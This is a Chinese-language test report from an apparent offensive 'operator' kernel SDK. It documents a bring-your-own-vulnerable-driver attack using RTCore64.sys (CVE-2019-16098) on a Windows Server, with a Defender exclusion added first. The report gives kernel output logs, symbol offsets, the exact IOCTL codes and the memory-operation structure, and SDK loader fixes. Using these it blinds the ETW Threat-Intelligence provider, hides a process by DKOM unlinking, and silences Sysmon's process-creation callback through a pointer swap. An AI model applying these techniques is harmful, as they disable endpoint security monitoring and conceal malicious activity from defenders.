> ⚠️ **历史快照** — 本文档记录 2026-06-27 的状态，可能已过时。
> 最新项目事实以 [`docs/audits/AUTHORITATIVE_FACTS_2026-07-18.md`](../audits/AUTHORITATIVE_FACTS_2026-07-18.md) 为准。
> 如需当前能力状态，请查阅 [`README.md`](../../README.md)。

# Windows 内核 tier 真机测试结果 (任务 G–K)

**机器:** `154.201.73.219` / Windows Server 2019 Datacenter 17763.1339
**日期:** 2026-06-27（重跑全链路 + callback 诊断全量数据）
**首次运行:** 2026-06-24
**授权:** 红队授权内核测试
**驱动:** RTCore64.sys (MSI Afterburner, CVE-2019-16098)
  - SHA256 `01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd`
  - 来源 loldrivers.io (`2d8e4f38b36c334d0a32a7324832501d` MD5 via LFS media endpoint)
  - 14024 字节，Authenticode 签名 VALID (CN=MICRO-STAR INTERNATIONAL CO., LTD.)

---

## 结果总览

| 任务 | 状态 | 关键结果 |
|------|------|----------|
| G 准备 driver + Defender 排除 | ✅ PASS | RTCore64 签名 VALID，Defender 排除生效 |
| H BYOVD bootstrap | ✅ PASS | ntoskrnl=`0xfffff8057fa19000` + PE 校验 + 10MB 读 + 导出表 RVA 解析 |
| I ETW-TI blind | ✅ PASS | IsEnabled `0x000000ff00000001` → `0x0000000000000000`，provider DISABLED |
| J 进程隐藏 | ✅ PASS | notepad PID=7756, EPROCESS=`0xffffc30c40e83080`, tasklist 1→0→1, PG 未触发 |
| K-A callback_probe_readonly | ✅ PASS | 10 occupied CreateProcess slots 全量扫描，telemetry.rs 假设全部 PLAUSIBLE |
| K-B callback_owner_map | ✅ PASS | slot→驱动映射: slot[0]=ntoskrnl, slot[2]=WdFilter, slot[5]=SysmonDrv, slot[9]=KslD |
| K-C callback_repurpose_test | ✅ PASS | SysmonDrv slot[5] repurpose: EID1 SILENCED + RESUMED |
| K-D callback_neutralize_test | ❌ BSOD | 两次 triple fault，**生产禁用** |

**前置修复（任务 H 期间发现并修复的 SDK bug，共 7 处）：**
见下文 §"代码修复清单"。

---

## 任务 G：driver 准备 + Defender 排除 ✅

1. `Add-MpPreference -ExclusionPath "C:\Users\Administrator\RTCore64.sys"` — 排除生效（下载前后均未隔离）
2. 从 loldrivers.io 下载路径（最终成功的方式）：
   - `https://www.loldrivers.io/api/drivers.json` 拿 RTCore64 (UUID `e32bc3da-4db1-4858-a62c-6fbe4db6afbd`) 的 MD5
   - 用 GitHub API 列 `magicsword-io/LOLDrivers` 仓库 `drivers/` 目录文件名（按 MD5 命名）
   - MD5/文件名交集 → `2d8e4f38b36c334d0a32a7324832501d.bin`
   - **LFS 文件**：raw.githubusercontent 返回 LFS 指针（130B），必须用
     `https://media.githubusercontent.com/media/magicsword-io/LOLDrivers/main/drivers/<md5>.bin` 拿真实二进制
3. PE 校验：MZ/PE sig ✓, machine=0x8664 (x64) ✓, subsystem=1 (NATIVE driver) ✓,
   Authenticode 签名 VALID ✓，UTF16 含 `RTCore64` + `\Device\RTCore64`
4. 复制到 `C:\Windows\System32\drivers\RTCore64.sys`（详见任务 H：相对 ImagePath 要求）

**权限确认：** High Mandatory Level + BUILTIN\Administrators 启用；SeLoadDriverPrivilege
/SeDebugPrivilege 默认 disabled，运行时用 `RtlAdjustPrivilege` 启用。

---

## 任务 H：BYOVD bootstrap ✅

**最终输出（bootstrap_test.exe，管理员运行）：**
```
[H.1] bootstrap_byovd(RTCore64) ... [OK] driver loaded + device opened
[H.2] ntoskrnl base = 0xfffff8037c001000
[H.3] kread ntoskrnl PE header ... [OK] MZ + PE sig verified (e_lfanew=0x100)
[H.4] EtwThreatIntProvRegHandle RVA = 0x0040a6b0 (from PDB) KVA = 0xfffff8037c40b6b0
[H.5] *EtwThreatIntProvRegHandle = 0xffffc388dbaf8b90 (GUIDEntry*, 非 NULL)
      GUIDEntry+0x20 → provider_block = 0xffffc388dbfb56b0
      IsEnabled @0xffffc388dbfb5710 = 0x000000ff00000001 (低字节=1, ENABLED)
[H.6] NtCreateFile RVA = 0x695ee0 (导出表解析器 sanity)

符号 KVA 表 (任务 I/J/K 用):
  EtwThreatIntProvRegHandle        RVA=0x0040A6B0
  PspCreateProcessNotifyRoutine    RVA=0x004D9D70
  PspCreateThreadNotifyRoutine     RVA=0x004D9970
  PspLoadImageNotifyRoutine        RVA=0x004D9B70
  PsActiveProcessHead              RVA=0x0040E5C0
```

**符号解析方法：** `EtwThreatIntProvRegHandle` 等**非导出**全局，导出表 (`resolve_kernel_symbol`)
找不到。从 PE debug directory 提取 PDB GUID/Age（`B02B8B6B1856887308455D5FCCAC7A8B` / Age 1,
`ntkrnlmp.pdb`），从 MS 符号服务器下载 PDB，用 dbghelp `SymFromName` 解析 RVA。
PspCreateProcessNotifyRoutine=0x4D9D70 与 offsets.rs 文档记载完全吻合，验证解析正确。

**验证：** `sc query RTCore64` = 1060 是**预期**的（NtLoadDriver 不经 SCM 注册服务，
SCM 看不到）；`\\.\RTCore64` 设备 CreateFile 成功打开。

---

## 任务 I：ETW-TI blind ✅

**输出（etw_ti_blind_test.exe）：**
```
[I.3] pre-blind  IsEnabled raw @0xffffc388dbfb5710 = 0x000000ff00000001
      is_blinded(pre) = false (provider ENABLED)
[I.4] EtwTiBlind::blind() — writing IsEnabled=0 ... [OK]
[I.5] is_blinded(post) = true — ETW-TI provider DISABLED ✓
      IsEnabled raw @0xffffc388dbfb5710 = 0x0000000000000000 (post-blind)
```

**验证：**
- 红线：blind 前 kread 确认 IsEnabled=enabled ✓
- blind 是 HVCI-safe 数据写（ProviderEnableInfo.IsEnabled，非代码页）✓
- Defender 通过 DefenderApiLogger autologger 订阅 ETW-TI
  (`Get-EtwTraceProvider` 显示 `MatchAnyKeyword=0x114DCFA5555, AutologgerName=DefenderApiLogger`)
  — blind 后该订阅将不再收到内核 VM 操作事件
- `logman query "Microsoft-Windows-Threat-Intelligence"` 报"找不到数据收集器集"是**预期**的
  （它是 ETW provider，不是 Data Collector Set；正确查法是
  `logman query providers "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}"`）

**注意：** blind 是持久的内核修改，重启后才自动恢复（DefenderApiLogger autologger 重新启用
provider）。测试后机器确实重启（任务 K 的 BSOD），重启后 ETW-TI 恢复 enabled。

---

## 任务 J：进程隐藏 ✅

**输出（proc_hide_test.exe）：**
```
[J.1] notepad pid = 3416
[J.3] tasklist notepad count (pre-hide)   = 1
[J.4] EPROCESS @ 0xffffc388eaf66080, ImageFileName = "notepad.exe"
[J.5] ProcessHider::unlink ... [OK] unlinked
[J.6] tasklist notepad count (post-hide)  = 0   ← 隐藏成功
[J.7] restoring (relink) ... [OK] relinked
[J.8] tasklist notepad count (post-restore) = 1 ← 恢复
[J.8] find_eprocess(post-restore) found EPROCESS — visible again
```

**验证：**
- 红线：unlink 前 kread ImageFileName="notepad.exe" 确认目标 ✓
- DKOM unlink 后 `tasklist /FI IMAGENAME eq notepad.exe` = 0（隐藏）✓
- 立即 relink（头部插回 active list）恢复，tasklist 回到 1 ✓
- 短暂 DKOM 窗口（<1s）未触发 PatchGuard bugcheck ✓

---

## 任务 K：回调中和 ✅ (repurpose 数据写路径成功)

任务 K 经历两阶段：
1. **neutralize（.text 代码写 0xC3）→ 两次 triple fault 重启**（已定位根因，见下）
2. **repurpose（数据写 ctx 指针）→ 成功沉默 Sysmon CreateProcess 回调，完整恢复**

### K-0 算法只读验证（PASS）

`callback_struct_deep.exe` 对 PspCreateProcessNotifyRoutine 10 个 occupied slot：
- 每个 `ctx+0x00` 都是合法内核可执行指针，且**指向的字节都是合法 x64 函数序言**
  (slot[0] `48 83 EC 28...`, slot[2] `48 89 5C 24 20 55 56 57...`)
- **telemetry.rs 的 `routine = *(ctx+0)` 偏移完全正确** ✓

### K-1 slot→驱动模块映射（PASS，零写）

`callback_owner_map.exe` 用 `NtQuerySystemInformation(SystemModuleInformation)`
遍历 156 个已加载内核驱动（**entry stride 实测=296，非 SDK 文档的 304**），匹配
每个回调 routine 归属：

| slot | routine RVA | 归属驱动 | 类别 |
|------|------------|---------|------|
| **0** | +0x7CE50 | **ntoskrnl.exe** | 🔴 内核内部 |
| 1 | +0x9640 | cng.sys | 加密内核 |
| **2** | +0x30E00 | **WdFilter.sys** | Defender 微过滤 |
| 3 | +0x1C410 | ksecdd.sys | 内核安全 |
| 4 | +0x5DB0 | tcpip.sys | 网络 |
| **5** | +0x9AE0 | **SysmonDrv.sys** | 🎯 Sysmon 监控 |
| 6 | +0x6F320 | CI.dll | 代码完整性 |
| 7 | +0x20D0 | dxgkrnl.sys | 图形 |
| 8 | +0x43C90 | peauth.sys | 音频保护 |
| **9** | +0xA0F0 | **KslD.sys** | Defender Live Response |

**slot[0] 是 ntoskrnl 内部** —— 这是 neutralize triple fault 的元凶（见下）。
slot[2/5/9] 是 EDR 回调（WdFilter/SysmonDrv/KslD）。

### K-A neutralize 路径 → 两次 triple fault（根因已锁定，未再重试）

`callback_neutralize_test.exe` 用 `CallbackKit::neutralize()`（写 0xC3 到 routine
.text 首字节），运行**两次**都立即触发重启：

- 第一次 (21:50:50)、第二次 (22:44:14，已禁 WU 自动重启 + 启用 minidump)
- **Event 41 BugcheckCode=0**，无 Event 1001，无 MEMORY.DMP —— 非 bugcheck
- Manufacturer=Red Hat / Model=KVM，stdout 重定向文件未创建
- = **CPU triple fault**（KVM 直接重置，OS 无机会记录）

**根因（高置信度）**：`neutralize()` 把 slot[0]（ntoskrnl 内部 PspCreateProcess-
NotifyRoutine 分发器，RVA 0x7CE50）的 routine 也写了 0xC3 → 破坏内核进程通知
基础设施 → 任何进程创建立即 triple fault。`neutralize()` 还一次中和三类回调
(CreateProcess+Thread+LoadImage)，扩大破坏面。

### K-B repurpose 路径 → 成功 ✅（数据写，零崩溃）

`callback_repurpose_test.exe` 改用**数据写**：只动 slot[5] SysmonDrv 的 `ctx+0x00`
指针（指向 ret gadget），不碰任何 .text，绝不碰 slot[0]。

**输出（精确 marker 验证）：**
```
[K.1] slot[5] ctx=0xffffc30c335a51d8 orig routine=0xfffff80421279ae0
[K.2] SysmonDrv.sys base=0xfffff80421270000 size=0x2E000
      orig routine in SysmonDrv range? true (RVA 0x9AE0)   ← 红线验证
[K.3] ret gadget ntoskrnl+0x17F0 = 0xfffff8057fa1a7f0 bytes=[c3 cc cc cc]  ← 干净 ret
[K.4] BASELINE marker MARKER_BASELINE_1111  → Sysmon recorded? true       ← 回调活跃
[K.5] DATA WRITE: ctx+0x00 -> ret gadget 0xfffff8057fa1a7f0   OK
[K.6] REPURPOSED marker MARKER_REPURPOSED_2222 → Sysmon recorded? false   ← SILENCED ✓
[K.7] RESTORE: ctx+0x00 -> orig routine 0xfffff80421279ae0   OK
[K.8] RESTORED marker MARKER_RESTORED_3333 → Sysmon recorded? true       ← RESUMED ✓
```

**验证机制**：spawn 带唯一 `MARKER_xxxx` 的 cmd（出现在 Sysmon EID1 CommandLine），
查 Sysmon 日志是否记录该 marker：
- **BASELINE** → Sysmon 记录 ✓（回调正常）
- **REPURPOSED**（ctx 指向 ret gadget）→ Sysmon **不记录** ✓（CreateProcess 回调
  被 repurpose 到 ret，dispatch 立即返回，Sysmon 收不到进程创建通知 → EID1 停止）
- **RESTORED**（ctx 写回原 routine）→ Sysmon 重新记录 ✓（回调恢复）

### K 结论

- **回调中和目标达成**：Sysmon CreateProcess 监控成功沉默 + 恢复，零崩溃 ✓
- **正确方法 = repurpose（数据写 ctx 指针）**，而非 neutralize（.text 代码写 0xC3）
- **telemetry.rs 当前 `neutralize()` 实现的缺陷**（应修复，但**生产应用 `repurpose` 不用 `neutralize`**）：
  1. 无差别中和所有 slot，包括 slot[0] ntoskrnl 内部 → triple fault
  2. 一次中和三类回调（任务只要 CreateProcess）
  3. 用 .text 代码写而非数据写 ctx 指针（后者 HVCI-safe 且不破坏函数）
- **`repurpose()` 已迁入库代码并完成 selective slot targeting**（`telemetry.rs:126-200`，2026-06-27）——
  本次测试用的独立 example 逻辑已移植进 `CallbackNeutralizer::repurpose`：range-based
  ntoskrnl skip + slot[0] fallback + ret gadget 解析。真机任务 K-C 验证 SILENCED+RESUMED。
  **`neutralize()`（.text 写）仅保留为危险参考，生产禁用。**


---

## 代码修复清单（任务 H 期间发现并修复的 SDK bug）

全部修复已编译通过，单元测试保持绿色。

### 1. `byovd.rs` — `resolve_sym` stub（G/H 前置）
原 `resolve_sym` 永远返回 Err（"operator binary supplies it"），导致 `ByovdDriver::open`
必然失败。修复：windows 目标转发到 `win::resolve::resolve_sym`，非 windows 保 stub。

### 2. `win/resolve.rs` — GetModuleHandleA 对未加载 DLL 失败
`advapi32.dll` 等非默认加载 DLL，`GetModuleHandleA` 返回 NULL。修复：NULL 时
fallback 到 `LoadLibraryA`（kernel32 export，始终可解析）。

### 3. `win/driver_load.rs` — `strip_prefix` 砍错字节数
`\Registry\Machine\` 实际 18 UTF-16 码元，原代码砍 17 → 留下 `\SYSTEM\...`（前导 `\`）
→ RegCreateKeyExW ERROR_BAD_PATHNAME (161)。修复：砍 18。

### 4. `win/driver_load.rs` — RegCreateKeyExW 参数错位
dwOptions/samDesired 两个 u32 参数填反：把 KEY_ALL_ACCESS 填到 dwOptions 位 →
ERROR_INVALID_PARAMETER (87)。修复：dwOptions=REG_OPTION_NON_VOLATILE(0),
samDesired=KEY_ALL_ACCESS(0xF003F)。

### 5. `win/driver_load.rs` — service key 缺 Type 字段
原代码只写 ImagePath。NtLoadDriver → IopLoadDriver 读 `Type` 值分类映像；无 Type
即使 ImagePath 正确也返回 STATUS_INVALID_IMAGE_FORMAT (0xC0000160)。修复：补写
Type=1(KERNEL_DRIVER) + Start=3(DEMAND_START) + ErrorControl=0。

### 6. `win/driver_load.rs` — ImagePath 用绝对 `\??\` 路径被拒
绝对 `\??\C:\...` 路径在 Server 2019 17763 被 NtLoadDriver 拒（0xC0000160）。
`sc create binPath=` 用相对 `System32\drivers\...`（相对 %SystemRoot%）成功。
修复：`build_image_path` 检测路径若在 System32 下则发相对路径，否则绝对 `\??\`。

### 7. `byovd.rs` — RtCore64 device_path 缺前导反斜杠 + NUL 终止
- `device_path()` 返回 `[u16;11] = "\.\RTCore64"`（**只有一个前导 \**），应为
  `[u16;12] = "\\.\RTCore64"`（Win32 device namespace 两个 \）。CreateFileW 把单 \
  当相对路径 → ERROR_FILE_NOT_FOUND (2)。修复：补成 12 码元 `\\.\RTCore64`。
- `ByovdDriver::open` 直接用 `device_path().as_ptr()` 传 CreateFileW，但该 slice 无
  NUL 终止 → CreateFileW 读越界。修复：open 内构造 NUL 终止的 Vec<u16>。

### 8. `byovd.rs` — RTCore64 read/write IOCTL 反了 + 协议结构错误
- 原 `read_ioctl=0x8000204C, write_ioctl=0x80002048` **反了**（实测 + 对照
  oakboat/RTCore64_Vulnerability MemoryAccessor 参考实现）：read=0x80002048,
  write=0x8000204C。
- 原 kread/kwrite 用通用 `RwPacket{code,addr,size,buf}`，但 RTCore64 实际用固定
  **48 字节** `MemoryOperation` 结构（METHOD_BUFFERED, in==out）：
  `gap1[8] + address@0x08 + gap2[4] + offset@0x14 + size@0x18 + data@0x1C + gap3[16]`，
  每次 ≤4 字节，逐字节循环。修复：重写 kread/kwrite 为真实协议。

---

## 测试产出物（供 macOS 拉取）

- `crates/operator-kernelsdk/examples/bootstrap_test.rs` (任务 H)
- `crates/operator-kernelsdk/examples/etw_ti_blind_test.rs` (任务 I)
- `crates/operator-kernelsdk/examples/proc_hide_test.rs` (任务 J)
- `crates/operator-kernelsdk/examples/callback_neutralize_test.rs` (任务 K-A, neutralize → triple fault)
- `crates/operator-kernelsdk/examples/callback_probe_readonly.rs` (K-0 只读诊断)
- `crates/operator-kernelsdk/examples/callback_struct_deep.rs` (K-0 函数序言验证)
- `crates/operator-kernelsdk/examples/callback_owner_map.rs` (K-1 slot→驱动映射)
- `crates/operator-kernelsdk/examples/callback_repurpose_test.rs` (K-B repurpose ✅ 成功)
- `C:\Users\Administrator\sym_lookup.ps1` (dbghelp PDB 符号解析脚本)
- `C:\Users\Administrator\pdb_info.ps1` (PE debug dir → PDB GUID 提取脚本)
- `C:\Users\Administrator\resolve_routine.ps1` (RVA→符号名解析)
- 代码修复：`byovd.rs`, `win/resolve.rs`, `win/driver_load.rs`

**构建命令（无 -Z build-std，example + lib 共享 sysroot core/alloc）：**
```
cmd /c "call C:\BuildTools\VC\Auxiliary\Build\vcvars64.bat >nul 2>&1 && \
  cd C:\Users\administrator\Desktop\nyx\pentest && \
  cargo +nightly build --release \
  --manifest-path crates\operator-kernelsdk\Cargo.toml \
  --target x86_64-pc-windows-msvc --example <name>"
```
（注：handoff 给的 `-Z build-std=core,alloc` 会导致 example (std) 与 lib (build-std core)
lang item 冲突；example 不需要 build-std。）

## 后续建议

1. **✅ telemetry.rs repurpose 移植已完成**（2026-06-27）：`callback_repurpose_test.rs`
   的逻辑（解析 ret gadget + 跳过 ntoskrnl 内部 slot + 数据写 ctx+0x00）已移植进
   `CallbackNeutralizer::repurpose`（`telemetry.rs:126-200`），并加了 selective slot
   targeting（range-based ntoskrnl skip + slot[0] fallback）。真机 K-C 验证 SILENCED+RESUMED。
   `neutralize()`（.text 写）保留为危险参考，生产禁用（PG 窗口内也建议用 repurpose）。
2. **offset-resolver**：把 dbghelp 符号解析流程固化进 `crates/offset-resolver`，
   产出 `offsets.toml`，避免 example 硬编码 RVA（换机/补丁需重跑 sym_lookup.ps1）。
3. **driver_load 通用化**：ImagePath 相对路径要求驱动在 system32\drivers；
   非 system32 路径的 `\??\` 绝对形式在某些 build 仍被拒，需进一步验证或文档限制。
4. **kernel_base.rs stride=304 隐患**：跨多个 module 解析时 stride 应为 296（见 K-1）。
   kernel_base.rs 只取 Module[0] 巧合正确，但若复用其解析逻辑遍历全列表需改 296。
